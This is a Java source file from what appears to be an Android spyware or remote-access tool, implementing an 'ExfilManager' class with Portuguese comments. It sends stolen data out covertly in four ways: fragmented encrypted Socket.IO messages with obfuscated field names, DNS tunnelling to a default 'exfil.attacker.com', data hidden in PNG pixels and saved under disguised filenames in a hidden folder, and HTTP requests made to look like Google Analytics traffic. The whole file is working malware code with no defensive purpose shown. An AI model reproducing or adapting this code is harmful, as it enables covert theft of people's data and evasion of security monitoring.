package com.etechd.l3mon.managers;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import com.etechd.l3mon.IOSocket;
import com.etechd.l3mon.StringCrypto;

/**
 * ExfilManager - Técnicas avançadas de exfiltração stealth
 *
 * Canais suportados:
 * - Fragmentação + Criptografia (Socket.IO)
 * - DNS Tunneling (consultas DNS)
 * - Esteganografia em PNG (LSB)
 * - HTTP Mimic (disfarçado de analytics/imagem)
 */
public class ExfilManager {

    private static final String TAG = "ExfilManager";
    private static final int CHUNK_SIZE = 380; // seguro para DNS + Socket

    public enum Channel {
        SOCKET_FRAGMENTED,
        DNS_TUNNEL,
        STEGANOGRAPHY_PNG,
        HTTP_MIMIC
    }

    // ==================== FRAGMENTAÇÃO + SOCKET ====================

    public static List<String> fragmentData(String data) {
        List<String> chunks = new ArrayList<>();
        for (int i = 0; i < data.length(); i += CHUNK_SIZE) {
            int end = Math.min(i + CHUNK_SIZE, data.length());
            chunks.add(data.substring(i, end));
        }
        return chunks;
    }

    /**
     * Envia via Socket.IO fragmentado + criptografado
     */
    public static void sendFragmented(String eventType, String plainData) {
        try {
            String encrypted = CryptoManager.encrypt(plainData);
            if (encrypted == null)
                encrypted = plainData;

            List<String> chunks = fragmentData(encrypted);

            for (int i = 0; i < chunks.size(); i++) {
                JSONObject frag = new JSONObject();
                frag.put(StringCrypto.d("EjzoMySf593GDkjPByro3A=="), i); // chunk_index
                frag.put(StringCrypto.d("4K3a5ngZ6qGBES9m9jtxeg=="), chunks.size()); // total_chunks
                frag.put(StringCrypto.d("B9G6+3heWf715hd4xk743g=="), chunks.get(i)); // data
                frag.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());

                if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
                    IOSocket.getInstance().getIoSocket().emit(eventType, frag);
                }

                try {
                    Thread.sleep(80);
                } catch (InterruptedException ignored) {
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "sendFragmented: " + e.getMessage());
        }
    }

    // ==================== DNS TUNNELING ====================

    /**
     * DNS Tunneling real.
     * Ex: sendViaDNSTunnel("exfil.seudominio.com", "dados_secretos");
     *
     * Requer controle sobre o DNS do domínio (ou domínio que loga todas as
     * queries).
     */
    public static void sendViaDNSTunnel(String baseDomain, String data) {
        try {
            String b64 = Base64.encodeToString(data.getBytes("UTF-8"), Base64.NO_WRAP);
            b64 = b64.replace("+", "-").replace("/", "_").replace("=", "");

            int labelSize = 55;
            List<String> labels = new ArrayList<>();
            for (int i = 0; i < b64.length(); i += labelSize) {
                int end = Math.min(i + labelSize, b64.length());
                labels.add(b64.substring(i, end));
            }

            for (int i = 0; i < labels.size(); i++) {
                String host = labels.get(i) + "." + (i + 1) + "-of-" + labels.size() + "." + baseDomain;
                try {
                    InetAddress.getByName(host); // Dispara a query DNS
                    Log.d(TAG, "DNS chunk " + (i + 1) + "/" + labels.size());
                } catch (Exception ignored) {
                }
                try {
                    Thread.sleep(120);
                } catch (Exception ignored) {
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "DNS tunnel: " + e.getMessage());
        }
    }

    public static void sendViaDNSTunnelSimple(String baseDomain, String data) {
        try {
            String b64 = Base64.encodeToString(data.getBytes("UTF-8"), Base64.NO_WRAP)
                    .replace("+", "-").replace("/", "_").replace("=", "");
            InetAddress.getByName(b64 + ".d." + baseDomain);
        } catch (Exception ignored) {
        }
    }

    // ==================== ESTEGANOGRAFIA EM IMAGEM (LSB) ====================

    /**
     * Cria PNG com dados escondidos no canal azul (LSB).
     * Imagem parece inofensiva (cinza claro).
     */
    public static byte[] createSteganographicPNG(String secretData, int width, int height) {
        try {
            Bitmap bmp = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);

            // Fundo "inocente"
            for (int y = 0; y < height; y++) {
                for (int x = 0; x < width; x++) {
                    int g = 180 + ((x + y) % 40);
                    bmp.setPixel(x, y, Color.argb(255, g, g, g));
                }
            }

            byte[] bytes = secretData.getBytes("UTF-8");
            StringBuilder bits = new StringBuilder();
            for (byte b : bytes) {
                bits.append(String.format("%8s", Integer.toBinaryString(b & 0xFF)).replace(' ', '0'));
            }

            int bitIdx = 0;
            for (int y = 0; y < height && bitIdx < bits.length(); y++) {
                for (int x = 0; x < width && bitIdx < bits.length(); x++) {
                    int color = bmp.getPixel(x, y);
                    int blue = color & 0xFF;

                    if (bits.charAt(bitIdx) == '1') {
                        blue |= 0x01;
                    } else {
                        blue &= 0xFE;
                    }

                    bmp.setPixel(x, y, Color.argb(255, Color.red(color), Color.green(color), blue));
                    bitIdx++;
                }
            }

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bmp.compress(Bitmap.CompressFormat.PNG, 100, baos);
            return baos.toByteArray();

        } catch (Exception e) {
            Log.e(TAG, "Stego PNG: " + e.getMessage());
            return null;
        }
    }

    /**
     * Extrai dados de PNG esteganografado (para debug/teste)
     */
    public static String extractFromSteganographicPNG(byte[] pngBytes) {
        try {
            Bitmap bmp = BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.length);
            if (bmp == null)
                return null;

            StringBuilder bits = new StringBuilder();
            for (int y = 0; y < bmp.getHeight(); y++) {
                for (int x = 0; x < bmp.getWidth(); x++) {
                    int blue = bmp.getPixel(x, y) & 0xFF;
                    bits.append((blue & 0x01) == 1 ? "1" : "0");
                }
            }

            StringBuilder out = new StringBuilder();
            for (int i = 0; i + 8 <= bits.length(); i += 8) {
                int val = Integer.parseInt(bits.substring(i, i + 8), 2);
                out.append((char) val);
            }
            return out.toString();
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Salva imagem esteganografada em local "inofensivo"
     */
    public static String saveStegoImage(byte[] pngBytes, String filename) {
        try {
            java.io.File dir = new java.io.File("/sdcard/.cache");
            if (!dir.exists())
                dir.mkdirs();

            java.io.File f = new java.io.File(dir, filename != null ? filename : "sys_update.png");
            java.io.FileOutputStream fos = new java.io.FileOutputStream(f);
            fos.write(pngBytes);
            fos.close();
            return f.getAbsolutePath();
        } catch (Exception e) {
            Log.e(TAG, "saveStego: " + e.getMessage());
            return null;
        }
    }

    // ==================== HTTP MIMIC ====================

    /**
     * Envia disfarçado de requisição de analytics ou imagem
     */
    public static void sendViaHttpMimic(String data, String targetUrl) {
        try {
            String enc = CryptoManager.encrypt(data);
            if (enc == null)
                enc = data;

            String b64 = Base64.encodeToString(enc.getBytes("UTF-8"), Base64.NO_WRAP);

            URL url = new URL(targetUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36");
            conn.setRequestProperty("Accept", "image/webp,image/apng,*/*");
            conn.setDoOutput(true);

            // Disfarça como parâmetro de analytics ou upload de imagem
            String payload = "v=1&tid=UA-123456-1&cid=" + System.currentTimeMillis() +
                    "&t=event&ec=perf&ea=img&el=" + b64;

            conn.getOutputStream().write(payload.getBytes("UTF-8"));
            conn.getOutputStream().close();

            int code = conn.getResponseCode();
            conn.disconnect();
            Log.d(TAG, "HTTP mimic: " + code);
        } catch (Exception e) {
            Log.e(TAG, "HTTP mimic: " + e.getMessage());
        }
    }

    // ==================== MÉTODO UNIFICADO ====================

    public static void exfiltrate(String data, Channel channel, String... params) {
        switch (channel) {
            case SOCKET_FRAGMENTED:
                String ev = params.length > 0 ? params[0] : "0xEX";
                sendFragmented(ev, data);
                break;

            case DNS_TUNNEL:
                String domain = params.length > 0 ? params[0] : "exfil.attacker.com";
                sendViaDNSTunnel(domain, data);
                break;

            case STEGANOGRAPHY_PNG:
                byte[] png = createSteganographicPNG(data, 48, 48);
                if (png != null) {
                    String path = saveStegoImage(png, "sys_" + System.currentTimeMillis() + ".png");
                    Log.d(TAG, "Stego image saved: " + path);
                }
                break;

            case HTTP_MIMIC:
                String url = params.length > 0 ? params[0] : "https://www.google-analytics.com/collect";
                sendViaHttpMimic(data, url);
                break;
        }
    }

    public static String b64(String s) {
        try {
            return Base64.encodeToString(s.getBytes("UTF-8"), Base64.NO_WRAP);
        } catch (Exception e) {
            return "";
        }
    }
}